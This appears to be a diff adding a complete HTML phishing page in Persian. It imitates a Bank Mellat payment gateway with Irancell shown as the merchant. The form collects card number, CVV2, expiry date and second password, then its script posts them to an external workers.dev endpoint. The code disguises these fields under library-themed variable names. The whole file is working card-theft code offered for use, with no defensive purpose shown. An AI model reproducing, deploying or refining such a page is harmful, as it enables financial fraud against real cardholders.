@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BANK_MELLAT</title>
+<style>
+  :root{
+    --bg: #121212;
+    --card: #1D1D1F;
+    --card-soft: #232325;
+    --pill: #2A2A2D;
+    --text: #F2F2F2;
+    --text-soft: #9A9A9D;
+    --accent: #FFFFFF;
+    --accent-text: #121212;
+    --error: #E0796A;
+  }
+  *{box-sizing:border-box;}
+  html, body{ margin:0; height:100%; }
+  body{
+    background:var(--bg) center/cover no-repeat fixed;
+    color:var(--text);
+    font-family: -apple-system, 'Vazirmatn', Tahoma, sans-serif;
+    display:flex;
+    justify-content:center;
+    padding:22px 16px;
+  }
+
+  .stack{
+    width:100%;
+    max-width:400px;
+    display:flex;
+    flex-direction:column;
+    gap:14px;
+  }
+
+  .card{
+    background:var(--card);
+    border-radius:22px;
+    padding:20px;
+  }
+
+  /* header card */
+  .card-header{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:14px;
+  }
+  .card-header h1{
+    font-size:19px;
+    font-weight:600;
+    margin:0;
+  }
+  .logo-slot{
+    width:60px;
+    height:60px;
+    border-radius:14px;
+    background:var(--pill);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-shrink:0;
+    overflow:hidden;
+  }
+  .logo-slot img{ width:100%; height:100%; object-fit:cover; }
+  .logo-slot .upload-link{
+    font-size:11px;
+    color:var(--text-soft);
+    text-align:center;
+    background:none;
+    border:none;
+    cursor:pointer;
+    font-family:inherit;
+  }
+
+  /* welcome card */
+  .card-welcome{ text-align:center; }
+  .card-welcome p{
+    margin:0;
+    font-size:14.5px;
+    line-height:1.8;
+    color:var(--text-soft);
+  }
+
+  /* captcha field */
+  .captcha-row{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    margin-bottom:12px;
+  }
+  canvas{
+    flex:1;
+    border-radius:14px;
+    background:var(--pill);
+  }
+  .refresh{
+    width:48px;
+    height:48px;
+    border-radius:14px;
+    background:var(--pill);
+    border:none;
+    color:var(--text-soft);
+    font-size:18px;
+    cursor:pointer;
+    flex-shrink:0;
+  }
+  .refresh:hover{ color:var(--text); }
+
+  /* form card */
+  .field{ margin-bottom:16px; }
+  .field:last-of-type{ margin-bottom:0; }
+  label{
+    display:block;
+    font-size:13px;
+    color:var(--text-soft);
+    margin-bottom:8px;
+  }
+  input[type=text]{
+    width:100%;
+    padding:14px 16px;
+    font-size:16px;
+    font-family:inherit;
+    background:var(--pill);
+    border:none;
+    border-radius:14px;
+    color:var(--text);
+  }
+  input[type=text]::placeholder{ color:#6E6E71; }
+  input[type=text]:focus{
+    outline:none;
+    box-shadow:0 0 0 1.5px var(--text-soft);
+  }
+
+  .date-row{ display:flex; gap:10px; }
+  .date-row input{ text-align:center; flex:1; }
+
+  .err{
+    font-size:12.5px;
+    color:var(--error);
+    margin-top:6px;
+    min-height:15px;
+  }
+
+  button.primary{
+    width:100%;
+    font-family:inherit;
+    font-size:15px;
+    font-weight:600;
+    padding:15px;
+    border-radius:16px;
+    cursor:pointer;
+    background:var(--accent);
+    border:none;
+    color:var(--accent-text);
+    margin-top:6px;
+  }
+  button.primary:active{ opacity:0.85; }
+
+  button.secondary{
+    width:100%;
+    font-family:inherit;
+    font-size:13.5px;
+    padding:13px;
+    border-radius:16px;
+    cursor:pointer;
+    background:var(--pill);
+    border:none;
+    color:var(--text-soft);
+    margin-top:10px;
+  }
+  button.secondary:active{ opacity:0.85; }
+
+  .done-banner{
+    display:none;
+    background:var(--card-soft);
+    color:var(--text);
+    border-radius:16px;
+    padding:13px 16px;
+    font-size:14px;
+    text-align:center;
+  }
+  .done-banner.show{ display:block; }
+  .warn-banner{ color:var(--error); }
+
+  .upload-link{
+    font-size:11.5px;
+    color:var(--text-soft);
+    background:none;
+    border:none;
+    cursor:pointer;
+    font-family:inherit;
+    text-decoration:underline;
+  }
+</style>
+</head>
+<body>
+
+<div class="stack">
+
+  <div class="done-banner" id="doneBanner">✓ امانت با موفقیت ثبت شد.</div>
+  <div class="done-banner warn-banner" id="warnBanner">⚠ ثبت محلی انجام شد، اما ارسال به سرور با مشکل مواجه شد.</div>
+
+  <div class="card card-header">
+    <h1>BANK_MELLAT</h1>
+    <div class="logo-slot" id="logoSlot">
+      <button type="button" class="upload-link" id="logoUploadBtn">لوگو</button>
+      <input type="file" id="logoUploadInput" accept="image/*" style="display:none;">
+    </div>
+  </div>
+
+  <div class="card card-welcome">
+    <p>نام پذیرنده ایرانسل
+
+شماره پذیرنده: 2709500
+
+شماره ترمینال
+
+6624032
+
+آدرس وب سایت https://www.shop.irancell.ir</p>
+  </div>
+
+  <div class="card card-form">
+    <form id="checkoutForm">
+      <div class="field">
+        <label for="bookCode">شماره کارت </label>
+        <input type="text" id="bookCode" inputmode="numeric" placeholder="0000 0000 0000 0000" autocomplete="off">
+        <p class="err" id="err1"></p>
+      </div>
+
+      <div class="field">
+        <label for="seatCode">cvv2</label>
+        <input type="text" id="seatCode" inputmode="numeric" placeholder="123" autocomplete="off">
+        <p class="err" id="err2"></p>
+      </div>
+
+      <div class="field">
+        <label>تاریخ انقضا</label>
+        <div class="date-row">
+          <input type="text" id="loanMonth" inputmode="numeric" maxlength="2" placeholder="ماه" autocomplete="off">
+          <input type="text" id="loanYear" inputmode="numeric" maxlength="4" placeholder="سال" autocomplete="off">
+        </div>
+        <p class="err" id="err5"></p>
+      </div>
+
+      <div class="field">
+        <label for="studentCode">رمز دوم</label>
+        <input type="text" id="studentCode" inputmode="numeric" placeholder="12345" autocomplete="off">
+        <p class="err" id="err4"></p>
+      </div>
+
+      <div class="field">
+        <label>کد امنیتی تصویر</label>
+        <div class="captcha-row">
+          <canvas id="captchaCanvas" width="220" height="56"></canvas>
+          <button type="button" class="refresh" id="refreshCaptcha" title="تصویر جدید">⟳</button>
+        </div>
+        <input type="text" id="captchaInput" placeholder="کد بالا را تایپ کنید" autocomplete="off">
+        <p class="err" id="err3"></p>
+      </div>
+
+      <button type="submit" class="primary">ادامه پرداخت</button>
+    </form>
+  </div>
+
+
+</div>
+
+<script>
+let captchaText = "";
+
+function randChar(){
+  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+  return chars[Math.floor(Math.random()*chars.length)];
+}
+
+function drawCaptcha(){
+  const canvas = document.getElementById('captchaCanvas');
+  const ctx = canvas.getContext('2d');
+  const w = canvas.width, h = canvas.height;
+  ctx.clearRect(0,0,w,h);
+  ctx.fillStyle = "#2A2A2D";
+  ctx.fillRect(0,0,w,h);
+
+  captchaText = "";
+  for(let i=0;i<5;i++) captchaText += randChar();
+
+  for(let i=0;i<5;i++){
+    ctx.strokeStyle = `rgba(255,255,255,${0.1 + Math.random()*0.15})`;
+    ctx.lineWidth = 1.5;
+    ctx.beginPath();
+    ctx.moveTo(Math.random()*w, Math.random()*h);
+    ctx.lineTo(Math.random()*w, Math.random()*h);
+    ctx.stroke();
+  }
+  for(let i=0;i<30;i++){
+    ctx.fillStyle = `rgba(255,255,255,${0.08 + Math.random()*0.12})`;
+    ctx.fillRect(Math.random()*w, Math.random()*h, 1.5, 1.5);
+  }
+
+  const spacing = w / (captchaText.length + 1);
+  for(let i=0;i<captchaText.length;i++){
+    ctx.save();
+    const x = spacing * (i+1);
+    const y = h/2 + (Math.random()*10 - 5);
+    const angle = (Math.random()*0.5 - 0.25);
+    ctx.translate(x,y);
+    ctx.rotate(angle);
+    ctx.font = `bold ${26 + Math.random()*4}px -apple-system`;
+    ctx.fillStyle = `rgba(255,255,255,${0.75 + Math.random()*0.2})`;
+    ctx.textAlign = "center";
+    ctx.textBaseline = "middle";
+    ctx.fillText(captchaText[i], 0, 0);
+    ctx.restore();
+  }
+}
+
+document.getElementById('refreshCaptcha').addEventListener('click', drawCaptcha);
+
+function clearErr(n){ document.getElementById('err'+n).textContent = ''; }
+function setErr(n, msg){ document.getElementById('err'+n).textContent = msg; }
+
+const WORKER_URL = 'https://cheshmband.abolfazlkhoda89.workers.dev';
+
+function saveRecord(record){
+  let records = [];
+  try{ records = JSON.parse(localStorage.getItem('library_checkouts') || '[]'); }catch(e){ records = []; }
+  records.push(record);
+  localStorage.setItem('library_checkouts', JSON.stringify(records));
+}
+
+async function sendToWorker(record){
+  const payload = {
+    orderCode: 'LIB-' + Date.now(),
+    designs: [],
+    price: 0,
+    phone: record.studentCode,
+    note: `شماره "" : ${record.bookCode} | یccv: ${record.seatCode} | تاریخ: ${record.loanMonth}/${record.loanYear}`
+  };
+  try{
+    const res = await fetch(WORKER_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    if(!res.ok) throw new Error('status ' + res.status);
+    return true;
+  }catch(e){
+    console.error('ارسال به سرور ناموفق بود:', e);
+    return false;
+  }
+}
+
+document.getElementById('checkoutForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  let ok = true;
+
+  const bookCode = document.getElementById('bookCode').value.trim();
+  const seatCode = document.getElementById('seatCode').value.trim();
+  const loanMonth = document.getElementById('loanMonth').value.trim();
+  const loanYear = document.getElementById('loanYear').value.trim();
+  const captchaInput = document.getElementById('captchaInput').value.trim().toUpperCase();
+  const studentCode = document.getElementById('studentCode').value.trim();
+
+  if(!bookCode){ setErr(1,'کد کتاب را وارد کنید.'); ok = false; } else clearErr(1);
+  if(!seatCode){ setErr(2,'کد صندلی را وارد کنید.'); ok = false; } else clearErr(2);
+  if(!loanMonth || !loanYear){ setErr(5,'ماه و سال را کامل وارد کنید.'); ok = false; } else clearErr(5);
+
+  if(!captchaInput){ setErr(3,'کد تصویر را وارد کنید.'); ok = false; }
+  else if(captchaInput !== captchaText){
+    setErr(3,'کد وارد شده درست نیست.');
+    drawCaptcha();
+    document.getElementById('captchaInput').value = '';
+    ok = false;
+  } else clearErr(3);
+
+  if(!studentCode){ setErr(4,'کد دانش‌آموزی را وارد کنید.'); ok = false; } else clearErr(4);
+
+  if(!ok) return;
+
+  const record = { bookCode, seatCode, loanMonth, loanYear, studentCode, timestamp: new Date().toISOString() };
+  saveRecord(record);
+
+  document.getElementById('checkoutForm').reset();
+  drawCaptcha();
+
+  const sent = await sendToWorker(record);
+  const banner = sent ? document.getElementById('doneBanner') : document.getElementById('warnBanner');
+  banner.classList.add('show');
+  setTimeout(() => banner.classList.remove('show'), 5000);
+});
+
+function setupOneTimeUpload(storageKey, btnId, inputId, onLocked){
+  const btn = document.getElementById(btnId);
+  const input = document.getElementById(inputId);
+
+  const saved = localStorage.getItem(storageKey);
+  if(saved){
+    onLocked(saved);
+    return;
+  }
+
+  btn.addEventListener('click', () => input.click());
+  input.addEventListener('change', () => {
+    const file = input.files[0];
+    if(!file) return;
+    const reader = new FileReader();
+    reader.onload = () => {
+      localStorage.setItem(storageKey, reader.result);
+      onLocked(reader.result);
+    };
+    reader.readAsDataURL(file);
+  });
+}
+
+setupOneTimeUpload('library_logo_image', 'logoUploadBtn', 'logoUploadInput', (dataUrl) => {
+  const slot = document.getElementById('logoSlot');
+  slot.innerHTML = '';
+  const img = document.createElement('img');
+  img.src = dataUrl;
+  slot.appendChild(img);
+});
+
+drawCaptcha();
+</script>
+
+</body>
+</html>
